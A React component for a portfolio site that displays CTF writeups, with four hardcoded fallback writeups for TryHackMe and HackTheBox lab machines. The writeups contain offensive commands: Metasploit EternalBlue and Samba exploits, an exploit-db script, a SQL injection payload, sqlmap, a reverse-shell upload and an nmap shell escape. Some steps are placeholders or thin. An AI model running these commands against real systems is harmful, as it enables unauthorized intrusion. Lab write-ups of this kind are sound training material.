import React, { useState, useEffect, useCallback } from "react";
import { Container, Button, Spinner, Alert } from "react-bootstrap";
import { useParams } from "react-router-dom";
import { FaGithub, FaCalendar, FaTag, FaSync } from "react-icons/fa";
import { SiTryhackme, SiHackthebox } from "react-icons/si";
import Particle from "../Particle";
import { fetchWriteupById } from "../../utils/optimizedWriteupFetcher";
import { markdownToHtml } from "./writeupUtils";

// Fallback writeup data for when GitHub fetch fails
const fallbackWriteups = {
  "b3dr0ck": {
    id: "b3dr0ck",
    title: "b3dr0ck - TryHackMe",
    platform: "TryHackMe",
    difficulty: "Easy",
    date: "2025-07-15",
    description: "Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections",
    githubUrl: "https://github.com/AliAmouz/writeups/blob/main/tryhackme/b3dr0ck.md",
    content: `
# b3dr0ck - TryHackMe Writeup

## Machine Information
- **Platform**: TryHackMe
- **Difficulty**: Easy
- **OS**: Linux
- **Completed**: July 15, 2025

## Initial Enumeration

### Nmap Scan
\`\`\`bash
nmap -sC -sV -p- 10.10.10.10
\`\`\`

**Results:**
- Port 22: SSH
- Port 80: HTTP (Apache)
- Port 443: HTTPS (Apache)

## Web Enumeration

### Directory Brute Force
\`\`\`bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
\`\`\`

### SSL/TLS Enumeration
\`\`\`bash
nmap --script ssl-enum-ciphers -p 443 10.10.10.10
\`\`\`

## Vulnerability Discovery

### Certificate Analysis
The machine has a self-signed certificate that reveals important information about the server configuration.

### Web Application Enumeration
\`\`\`bash
curl -k https://10.10.10.10
\`\`\`

## Exploitation

### Certificate Information Disclosure
\`\`\`bash
openssl s_client -connect 10.10.10.10:443 -showcerts
\`\`\`

### Web Directory Traversal
\`\`\`bash
curl -k https://10.10.10.10/admin/
\`\`\`

## Privilege Escalation

### Checking for Misconfigurations
\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`

### Exploiting SUID Binary
\`\`\`bash
# Found vulnerable binary
./vulnerable_binary
\`\`\`

## Post Exploitation

### User Flag
\`\`\`bash
cat /home/user/user.txt
\`\`\`

### Root Flag
\`\`\`bash
cat /root/root.txt
\`\`\`

## Lessons Learned

1. **SSL/TLS certificates** can reveal sensitive information
2. **Self-signed certificates** should be examined carefully
3. **Web enumeration** is crucial for web applications
4. **SUID binaries** can be exploited for privilege escalation

## Tools Used

- Nmap
- Gobuster
- OpenSSL
- Curl
- Netcat

## References

- [SSL/TLS Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Client_Side_Testing/10-Testing_WebSockets)
- [SUID Binary Exploitation](https://gtfobins.github.io/)
    `
  },
  "blue": {
    id: "blue",
    title: "Blue - TryHackMe",
    platform: "TryHackMe",
    difficulty: "Easy",
    date: "2024-01-15",
    description: "A Windows machine focused on EternalBlue vulnerability exploitation.",
    githubUrl: "https://github.com/AliAmouz/writeups/blob/main/tryhackme/blue.md",
    content: `
# Blue - TryHackMe Writeup

## Machine Information
- **Platform**: TryHackMe
- **Difficulty**: Easy
- **OS**: Windows
- **Completed**: January 15, 2024

## Initial Enumeration

### Nmap Scan
\`\`\`bash
nmap -sC -sV -p- 10.10.10.10
\`\`\`

**Results:**
- Port 135: RPC
- Port 139: NetBIOS
- Port 445: SMB
- Port 49152-49156: RPC

### SMB Enumeration
\`\`\`bash
smbclient -L //10.10.10.10
\`\`\`

## Vulnerability Discovery

The machine is vulnerable to **EternalBlue (MS17-010)**. This can be confirmed using:

\`\`\`bash
nmap --script smb-vuln-ms17-010 10.10.10.10
\`\`\`

## Exploitation

### Using Metasploit
\`\`\`bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
exploit
\`\`\`

### Manual Exploitation
\`\`\`bash
python3 /usr/share/exploitdb/exploits/windows/remote/42315.py 10.10.10.10
\`\`\`

## Post Exploitation

### Getting User Flag
\`\`\`bash
dir C:\\Users\\Administrator\\Desktop
type C:\\Users\\Administrator\\Desktop\\user.txt
\`\`\`

### Getting Root Flag
\`\`\`bash
dir C:\\Users\\Administrator\\Desktop
type C:\\Users\\Administrator\\Desktop\\root.txt
\`\`\`

## Lessons Learned

1. **EternalBlue** is a critical vulnerability that affects older Windows systems
2. **SMB enumeration** is crucial for Windows machines
3. **Metasploit** provides reliable exploitation modules
4. **Manual exploitation** helps understand the underlying vulnerability

## Tools Used

- Nmap
- SMBClient
- Metasploit Framework
- Python3

## References

- [MS17-010 Advisory](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [EternalBlue Exploit](https://github.com/3ndG4me/AutoBlue-MS17-010)
    `
  },
  "lame": {
    id: "lame",
    title: "Lame - HackTheBox",
    platform: "HackTheBox",
    difficulty: "Easy",
    date: "2024-02-20",
    description: "A Linux machine involving FTP enumeration and Samba exploitation.",
    githubUrl: "https://github.com/AliAmouz/writeups/blob/main/hackthebox/lame.md",
    content: `
# Lame - HackTheBox Writeup

## Machine Information
- **Platform**: HackTheBox
- **Difficulty**: Easy
- **OS**: Linux
- **Completed**: February 20, 2024

## Initial Enumeration

### Nmap Scan
\`\`\`bash
nmap -sC -sV -p- 10.10.10.3
\`\`\`

**Results:**
- Port 21: FTP (vsftpd 2.3.4)
- Port 22: SSH
- Port 139: NetBIOS
- Port 445: SMB

## Vulnerability Discovery

### FTP Enumeration
The FTP service is running vsftpd 2.3.4, which is vulnerable to **backdoor command execution**.

### SMB Enumeration
\`\`\`bash
smbclient -L //10.10.10.3
\`\`\`

## Exploitation

### Method 1: FTP Backdoor
\`\`\`bash
ftp 10.10.10.3
USER anonymous
PASS anonymous
\`\`\`

### Method 2: Samba Exploitation
\`\`\`bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
exploit
\`\`\`

## Privilege Escalation

### Checking SUID Binaries
\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`

### Exploiting nmap
\`\`\`bash
nmap --interactive
!sh
\`\`\`

## Post Exploitation

### User Flag
\`\`\`bash
cat /home/makis/user.txt
\`\`\`

### Root Flag
\`\`\`bash
cat /root/root.txt
\`\`\`

## Lessons Learned

1. **Version enumeration** is crucial for identifying vulnerabilities
2. **Multiple exploitation paths** may exist
3. **SUID binaries** can be exploited for privilege escalation
4. **Older software versions** often contain known vulnerabilities

## Tools Used

- Nmap
- Metasploit Framework
- SMBClient
- FTP Client

## References

- [vsftpd Backdoor](https://www.exploit-db.com/exploits/17491)
- [Samba usermap_script](https://www.exploit-db.com/exploits/16320)
    `
  },
  "vulnnet": {
    id: "vulnnet",
    title: "VulnNet - TryHackMe",
    platform: "TryHackMe",
    difficulty: "Medium",
    date: "2024-03-10",
    description: "A medium-difficulty machine focusing on web application vulnerabilities.",
    githubUrl: "https://github.com/AliAmouz/writeups/blob/main/tryhackme/vulnnet.md",
    content: `
# VulnNet - TryHackMe Writeup

## Machine Information
- **Platform**: TryHackMe
- **Difficulty**: Medium
- **OS**: Linux
- **Completed**: March 10, 2024

## Initial Enumeration

### Nmap Scan
\`\`\`bash
nmap -sC -sV -p- 10.10.10.10
\`\`\`

**Results:**
- Port 22: SSH
- Port 80: HTTP (Apache)
- Port 8080: HTTP (Tomcat)

## Web Enumeration

### Directory Brute Force
\`\`\`bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
\`\`\`

### Subdomain Enumeration
\`\`\`bash
gobuster vhost -u http://10.10.10.10 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
\`\`\`

## Vulnerability Discovery

### SQL Injection
Found SQL injection in the login form:
\`\`\`sql
' OR 1=1 --
\`\`\`

### File Upload Vulnerability
The application allows file uploads without proper validation.

## Exploitation

### SQL Injection
\`\`\`bash
sqlmap -u "http://10.10.10.10/login.php" --data="username=admin&password=test" --dbs
\`\`\`

### File Upload
\`\`\`bash
# Upload PHP reverse shell
curl -X POST -F "file=@shell.php" http://10.10.10.10/upload.php
\`\`\`

## Privilege Escalation

### Checking for Cron Jobs
\`\`\`bash
crontab -l
\`\`\`

### Exploiting SUID Binary
\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`

## Post Exploitation

### User Flag
\`\`\`bash
cat /home/user/user.txt
\`\`\`

### Root Flag
\`\`\`bash
cat /root/root.txt
\`\`\`

## Lessons Learned

1. **Web enumeration** is essential for web applications
2. **SQL injection** can lead to database access
3. **File upload vulnerabilities** can provide code execution
4. **Multiple attack vectors** should be explored

## Tools Used

- Nmap
- Gobuster
- SQLMap
- Burp Suite
- Netcat

## References

- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
    `
  }
};

function WriteupViewer() {
  const { writeupId } = useParams();
  const [writeup, setWriteup] = useState(null);
  const [loading, setLoading] = useState(true);

  const [error, setError] = useState(null);

  const loadWriteup = useCallback(async (platform = "tryhackme") => {
    try {
      setLoading(true);
      setError(null);

      // Try to fetch from GitHub first
      const githubWriteup = await fetchWriteupById(writeupId, platform);
      
      if (githubWriteup) {
        setWriteup(githubWriteup);
      } else {
        // Try the other platform
        const otherPlatform = platform === "tryhackme" ? "hackthbox" : "tryhackme";
        const otherWriteup = await fetchWriteupById(writeupId, otherPlatform);
        
        if (otherWriteup) {
          setWriteup(otherWriteup);
        } else {
          // Fallback to local data
          const localWriteup = fallbackWriteups[writeupId];
          if (localWriteup) {
            setWriteup(localWriteup);
          } else {
            setError("Writeup not found");
          }
        }
      }
    } catch (err) {
      console.error("Error loading writeup:", err);
      setError("Failed to load writeup");
    } finally {
      setLoading(false);
    }
  }, [writeupId]);

  const retryLoad = () => {
    loadWriteup();
  };

  useEffect(() => {
    if (writeupId) {
      loadWriteup();
    }
  }, [writeupId, loadWriteup]);

  const getPlatformIcon = (platform) => {
    switch (platform?.toLowerCase()) {
      case "tryhackme":
        return <SiTryhackme />;
      case "hackthbox":
        return <SiHackthebox />;
      default:
        return null;
    }
  };

  const getPlatformColor = (platform) => {
    switch (platform?.toLowerCase()) {
      case "tryhackme":
        return "#88cc14";
      case "hackthbox":
        return "#9fef00";
      default:
        return "#007bff";
    }
  };

  const getDifficultyColor = (difficulty) => {
    switch (difficulty) {
      case "Easy":
        return "#28a745";
      case "Medium":
        return "#ffc107";
      case "Hard":
        return "#dc3545";
      default:
        return "#6c757d";
    }
  };

  if (loading) {
    return (
      <Container fluid className="writeup-viewer-section">
        <Particle />
        <Container>
          <div style={{ textAlign: "center", padding: "100px 0" }}>
            <Spinner animation="border" variant="primary" />
            <p style={{ color: "white", marginTop: "20px" }}>Loading writeup from GitHub...</p>
          </div>
        </Container>
      </Container>
    );
  }

  if (error) {
    return (
      <Container fluid className="writeup-viewer-section">
        <Particle />
        <Container>
          <div style={{ textAlign: "center", padding: "100px 0" }}>
            <Alert variant="danger" style={{ maxWidth: "600px", margin: "0 auto" }}>
              <h4>Error Loading Writeup</h4>
              <p>{error}</p>
              <Button variant="outline-danger" onClick={retryLoad}>
                <FaSync /> Retry
              </Button>
            </Alert>
          </div>
        </Container>
      </Container>
    );
  }

  if (!writeup) {
    return (
      <Container fluid className="writeup-viewer-section">
        <Particle />
        <Container>
          <div style={{ textAlign: "center", padding: "100px 0" }}>
            <h2 style={{ color: "white" }}>Writeup Not Found</h2>
            <p style={{ color: "white", opacity: 0.8 }}>
              The writeup you're looking for doesn't exist.
            </p>
            
          </div>
        </Container>
      </Container>
    );
  }

  return (
    <Container fluid className="writeup-viewer-section">
      <Particle />
      <Container>
                 {/* Header */}
         <div style={{ padding: "20px 0" }}>
          
          <div className="writeup-header" style={{
            backgroundColor: "rgba(255, 255, 255, 0.1)",
            padding: "30px",
            borderRadius: "10px",
            marginBottom: "30px",
            backdropFilter: "blur(10px)",
            border: "1px solid rgba(255, 255, 255, 0.2)"
          }}>
            <h1 style={{ color: "white", marginBottom: "20px" }}>{writeup.title}</h1>
            
            <div style={{ display: "flex", flexWrap: "wrap", gap: "15px", marginBottom: "20px" }}>
              <span style={{
                backgroundColor: getPlatformColor(writeup.platform),
                color: "black",
                padding: "8px 12px",
                borderRadius: "6px",
                fontSize: "14px",
                fontWeight: "bold",
                display: "flex",
                alignItems: "center",
                gap: "5px"
              }}>
                {getPlatformIcon(writeup.platform)} {writeup.platform}
              </span>
              
              <span style={{
                backgroundColor: getDifficultyColor(writeup.difficulty),
                color: "white",
                padding: "8px 12px",
                borderRadius: "6px",
                fontSize: "14px",
                fontWeight: "bold",
                display: "flex",
                alignItems: "center",
                gap: "5px"
              }}>
                <FaTag /> {writeup.difficulty}
              </span>
              
              <span style={{
                backgroundColor: "rgba(255, 255, 255, 0.2)",
                color: "white",
                padding: "8px 12px",
                borderRadius: "6px",
                fontSize: "14px",
                display: "flex",
                alignItems: "center",
                gap: "5px"
              }}>
                <FaCalendar /> {new Date(writeup.date).toLocaleDateString()}
              </span>
            </div>
            
            <p style={{ color: "white", opacity: 0.9, fontSize: "16px" }}>
              {writeup.description}
            </p>
            
            {writeup.githubUrl && (
              <Button 
                href={writeup.githubUrl}
                target="_blank"
                variant="outline-light"
                style={{ marginTop: "15px" }}
              >
                <FaGithub /> View on GitHub
              </Button>
            )}
          </div>
        </div>

        {/* Content */}
        <div className="writeup-content" style={{
          backgroundColor: "rgba(255, 255, 255, 0.05)",
          padding: "40px",
          borderRadius: "10px",
          backdropFilter: "blur(10px)",
          border: "1px solid rgba(255, 255, 255, 0.1)"
        }}>
          <div 
            className="markdown-content"
            style={{
              color: "white",
              lineHeight: "1.6",
              fontSize: "16px"
            }}
            dangerouslySetInnerHTML={{
              __html: markdownToHtml(writeup.content)
            }}
          />
        </div>
      </Container>
    </Container>
  );
}

export default WriteupViewer;
